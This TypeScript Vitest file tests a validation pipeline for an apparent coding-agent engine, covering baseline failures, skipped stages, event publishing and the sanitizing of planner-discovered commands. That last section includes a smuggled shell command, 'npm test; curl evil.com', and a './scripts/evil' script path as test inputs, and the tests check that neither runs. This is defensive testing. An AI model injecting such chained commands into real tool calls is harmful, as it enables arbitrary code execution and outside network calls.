import { describe, it, expect, afterEach, beforeEach } from 'vitest';
import { writeFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { createValidator } from './run.js';
import { formatValidationError } from './format-error.js';
import { createEventBus } from '../../events/bus.js';
import type { EngineEvent, EngineEventOf } from '../../events/types.js';
import { createTempDir, cleanupTempDir } from '#testing/helpers/temp-dir.js';
import type { Task } from '../../../core/schemas/task.js';
import { makeTask } from '#testing/helpers/factories/task.js';
import type { DiscoveredValidation } from '../../../core/schemas/workflow.js';
import { processError } from '../../../lib/process/errors.js';
import { makeConfig, makeCommandRunner } from '#testing/helpers/validation-fixtures.js';

function mkTask(file: string): Task {
  return makeTask({ file, action: 'modify' });
}

const fakeBus = { publish: () => {}, subscribe: () => () => {} };

describe('run-start baseline of pre-existing failures', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-baseline');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('relabels a first-task failure that was already failing before any task', async () => {
    const typeError = () =>
      processError.exitCode({ command: 'tsc', code: 1, stderr: 'type error', output: '' });
    const validator = createValidator({
      runCommand: makeCommandRunner(typeError(), typeError()),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');

    await validator.primeBaseline({ task: mkTask('src/app.ts'), projectDir: tempDir, config });
    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(validator.getBaselineFailingStages?.()?.has('typecheck')).toBe(true);
    const error = formatValidationError(results, validator.getBaselineFailingStages?.());
    expect(error).toContain('pre-existing failure');
    expect(error).toContain('not caused by this task');
  });

  it('probes the default test baseline against the affected test file, not the whole suite', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner, captureBaseline: true });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    await validator.primeBaseline({ task: mkTask('src/foo.ts'), projectDir: tempDir, config });

    const baselineProbe = runner.calls[0];
    expect(baselineProbe?.cmd).toBe('npm');
    expect(baselineProbe?.args).toEqual(['test', '--', join(tempDir, 'src', 'foo.test.ts')]);
  });

  it('attributes a fresh test failure to the task when the affected file passed at baseline', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    const validator = createValidator({
      runCommand: makeCommandRunner(
        { stdout: 'ok', stderr: '', code: 0 },
        processError.exitCode({ command: 'npm', code: 1, stderr: 'test failed', output: '' }),
      ),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    await validator.primeBaseline({ task: mkTask('src/foo.ts'), projectDir: tempDir, config });
    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(validator.getBaselineFailingStages?.()?.has('test')).toBe(false);
    const error = formatValidationError(results, validator.getBaselineFailingStages?.());
    expect(error).toContain('Your previous code had an error');
    expect(error).not.toContain('pre-existing');
  });

  it('does not record a baseline failure when a heuristic command is missing its subcommand', async () => {
    const missingClippy = () =>
      processError.exitCode({
        command: 'cargo',
        label: 'lint validation',
        code: 101,
        stderr: 'error: no such command: `clippy`',
        output: '',
      });
    const validator = createValidator({
      runCommand: makeCommandRunner(missingClippy(), missingClippy()),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: true, test: false });
    writeFileSync(join(tempDir, 'Cargo.toml'), '[package]\nname = "test"');

    await validator.primeBaseline({ task: mkTask('src/main.rs'), projectDir: tempDir, config });

    expect(validator.getBaselineFailingStages?.()?.has('lint')).toBe(false);
  });

  it('does not relabel when the project was green at run start', async () => {
    const validator = createValidator({
      runCommand: makeCommandRunner(
        { stdout: 'ok', stderr: '', code: 0 },
        processError.exitCode({ command: 'tsc', code: 1, stderr: 'new error', output: '' }),
      ),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');

    await validator.primeBaseline({ task: mkTask('src/app.ts'), projectDir: tempDir, config });
    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(validator.getBaselineFailingStages?.()?.has('typecheck')).toBe(false);
    const error = formatValidationError(results, validator.getBaselineFailingStages?.());
    expect(error).toContain('Your previous code had an error');
    expect(error).not.toContain('pre-existing');
  });
});

describe('validation pipeline', () => {
  let tempDir: string;
  let validator: ReturnType<typeof createValidator>;

  beforeEach(() => {
    tempDir = createTempDir('val-pipe');
    validator = createValidator({ runCommand: makeCommandRunner() });
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('skips typecheck when master switch is off', async () => {
    const config = makeConfig({
      typecheck: false,
      typecheckCommand: 'cargo check',
      lint: false,
      test: false,
    });
    const results = await validator.runValidation({
      task: mkTask('src/main.rs'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    expect(results).toHaveLength(0);
  });

  it('skips lint when master switch is off', async () => {
    const config = makeConfig({ lint: false, lintCommand: 'cargo clippy' });
    const results = await validator.runValidation({
      task: mkTask('src/main.rs'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const lintResult = results.find((r) => r.stage === 'lint');
    expect(lintResult).toBeUndefined();
  });

  it('skips test when master switch is off', async () => {
    const config = makeConfig({ test: false });
    mkdirSync(join(tempDir, 'tests'), { recursive: true });
    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const testResult = results.find((r) => r.stage === 'test');
    expect(testResult).toBeUndefined();
  });

  it('publishes the active validation command before the stage completes', async () => {
    const runner = makeCommandRunner({ stdout: '', stderr: '', code: 0 });
    validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: false,
      test: false,
    });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    const results = await validator.runValidation({
      task: mkTask('src/main.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'validating-task',
    });

    expect(results[0]).toMatchObject({
      stage: 'typecheck',
      command: 'npm run typecheck',
    });
    expect(
      events.find(
        (event): event is EngineEventOf<'validate'> =>
          event.type === 'validate' &&
          event.status === 'running' &&
          event.activeStage === 'typecheck',
      ),
    ).toMatchObject({
      commands: { typecheck: 'npm run typecheck' },
    });
    expect(
      events.find(
        (event): event is EngineEventOf<'validate'> =>
          event.type === 'validate' && event.status === 'done',
      ),
    ).toMatchObject({
      commands: { typecheck: 'npm run typecheck' },
    });
  });
});

describe('all-stages-skipped warning', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-allskip');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('publishes a warning when every enabled stage resolves to a skip', async () => {
    const validator = createValidator({ runCommand: makeCommandRunner() });
    const config = makeConfig({ typecheck: true, lint: true, test: true, testCommand: undefined });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((e) => events.push(e));

    await validator.runValidation({
      task: mkTask('src/app.js'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    const warning = events.find((e): e is EngineEventOf<'warning'> => e.type === 'warning');
    expect(warning?.message).toContain('was not validated');
  });

  it('does NOT publish the warning when a stage actually ran', async () => {
    const validator = createValidator({ runCommand: makeCommandRunner() });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((e) => events.push(e));

    await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    expect(events.find((e) => e.type === 'warning')).toBeUndefined();
  });
});

describe('discovered validation sanitization', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-sanitize');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('does NOT execute planner-discovered ./evil-script', async () => {
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: false,
      lint: false,
      test: true,
      testCommand: undefined,
    });
    const discovered: DiscoveredValidation = { testCommand: './scripts/evil' };

    mkdirSync(join(tempDir, 'tests'), { recursive: true });
    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');

    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      discoveredValidation: discovered,
    });

    for (const call of runner.calls) {
      expect(call.cmd).not.toContain('evil');
      expect(call.args.join(' ')).not.toContain('evil');
    }
    if (results.length > 0) {
      expect(results.find((r) => r.stage === 'test')?.output).not.toContain('evil');
    }
  });

  it('does NOT execute planner-discovered commands with shell operators', async () => {
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: false,
      lint: false,
      test: true,
      testCommand: undefined,
    });
    const discovered: DiscoveredValidation = { testCommand: 'npm test; curl evil.com' };

    mkdirSync(join(tempDir, 'tests'), { recursive: true });
    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');

    await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      discoveredValidation: discovered,
    });

    for (const call of runner.calls) {
      expect(call.cmd).not.toContain('curl');
      expect(call.args.join(' ')).not.toContain('curl');
    }
  });

  it('executes safe planner-discovered commands normally', async () => {
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: false,
      lint: false,
      test: true,
      testCommand: undefined,
    });
    const discovered: DiscoveredValidation = { testCommand: 'npx vitest run' };

    await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      discoveredValidation: discovered,
    });

    expect(runner.calls.length).toBeGreaterThan(0);
    expect(runner.calls[0]?.cmd).toBe('npx');
    expect(runner.calls[0]?.args).toContain('vitest');
  });
});
